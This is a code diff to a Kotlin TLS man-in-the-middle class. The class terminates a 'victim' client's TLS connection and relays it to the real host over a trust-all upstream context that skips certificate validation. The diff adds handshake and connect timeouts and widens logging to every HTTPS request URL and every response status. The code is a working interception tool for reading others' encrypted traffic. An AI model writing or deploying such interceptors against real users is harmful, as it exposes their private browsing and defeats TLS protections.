@@ -31,6 +31,11 @@ import kotlin.concurrent.thread
  */
 class TlsMitm {
 
+    private companion object {
+        const val CONNECT_TIMEOUT_MS = 8000
+        const val HANDSHAKE_TIMEOUT_MS = 15000
+    }
+
     private val _running = MutableStateFlow(false)
     val running: StateFlow<Boolean> = _running.asStateFlow()
 
@@ -93,34 +98,38 @@ class TlsMitm {
             vp.setSNIMatchers(listOf(matcher))
             vp.setApplicationProtocols(arrayOf("http/1.1"))
             vs.setSSLParameters(vp)
+            // bound the handshake so a stalled/validating client can't pin a thread forever
+            raw.soTimeout = HANDSHAKE_TIMEOUT_MS
             vs.startHandshake()
+            raw.soTimeout = 0
             val host = matcher.host ?: run { vs.close(); return }
 
+            // upstream: connect with a timeout, then layer TLS over the connected socket
             val up = SSLContext.getInstance("TLS")
             up.init(null, trustAll, null)
-            val us = up.socketFactory.createSocket(host, 443) as SSLSocket
+            val plain = Socket()
+            plain.connect(InetSocketAddress(host, 443), CONNECT_TIMEOUT_MS)
+            val us = up.socketFactory.createSocket(plain, host, 443, true) as SSLSocket
             upstream = us
             val upp = us.getSSLParameters()
             upp.setServerNames(listOf(SNIHostName(host)))
             upp.setApplicationProtocols(arrayOf("http/1.1"))
             us.setSSLParameters(upp)
+            plain.soTimeout = HANDSHAKE_TIMEOUT_MS
             us.startHandshake()
+            plain.soTimeout = 0
 
             val vIn = victim.inputStream; val vOut = victim.outputStream
             val uIn = upstream.inputStream; val uOut = upstream.outputStream
             val v = victim; val u = upstream
-            // upstream -> victim
-            thread(name = "tls-down") { pump(uIn, vOut); closeQuiet(v); closeQuiet(u) }
-            // victim -> upstream (parse the first request for logging)
+            // upstream -> victim: log each response status line as it flows back
+            thread(name = "tls-down") { pump(uIn, vOut) { logResponse(host, it) }; closeQuiet(v); closeQuiet(u) }
+            // victim -> upstream: log EVERY request (keep-alive reuses the connection), then relay
             val buf = ByteArray(16384)
-            var sniffed = false
             while (true) {
                 val n = vIn.read(buf)
                 if (n < 0) break
-                if (!sniffed) {
-                    sniffed = true
-                    logRequest(host, String(buf, 0, n.coerceAtMost(2048), Charsets.ISO_8859_1))
-                }
+                logRequest(host, String(buf, 0, n.coerceAtMost(2048), Charsets.ISO_8859_1))
                 uOut.write(buf, 0, n); uOut.flush()
             }
         } catch (_: Throwable) {
@@ -130,22 +139,30 @@ class TlsMitm {
         }
     }
 
+    // Only a genuine HTTP/1.x request line: METHOD SP target SP HTTP/1.x. Avoids logging mid-stream
+    // body bytes as if they were requests now that we scan every read (keep-alive).
+    private val requestLine = Regex("""^([A-Z]{3,7}) (\S+) HTTP/1\.[01]""")
+    private val statusLine = Regex("""^HTTP/1\.[01] (\d{3})""")
+
     private fun logRequest(host: String, head: String) {
         val line = head.substringBefore("\r\n")
-        val parts = line.split(" ")
-        if (parts.size >= 2 && parts[0].length in 3..7) {
-            onLine?.invoke("[TLS] ${parts[0]} https://$host${parts[1]}")
-        } else {
-            onLine?.invoke("[TLS] https://$host (${line.take(40)})")
-        }
+        val m = requestLine.find(line) ?: return
+        onLine?.invoke("[TLS] ${m.groupValues[1]} https://$host${m.groupValues[2]}")
     }
 
-    private fun pump(inp: java.io.InputStream, out: java.io.OutputStream) {
+    private fun logResponse(host: String, head: String) {
+        val line = head.substringBefore("\r\n")
+        val m = statusLine.find(line) ?: return
+        onLine?.invoke("[TLS]   → ${m.groupValues[1]} ($host)")
+    }
+
+    private fun pump(inp: java.io.InputStream, out: java.io.OutputStream, peek: ((String) -> Unit)? = null) {
         val b = ByteArray(16384)
         try {
             while (true) {
                 val n = inp.read(b)
                 if (n < 0) break
+                if (peek != null) peek(String(b, 0, n.coerceAtMost(512), Charsets.ISO_8859_1))
                 out.write(b, 0, n); out.flush()
             }
         } catch (_: Throwable) {
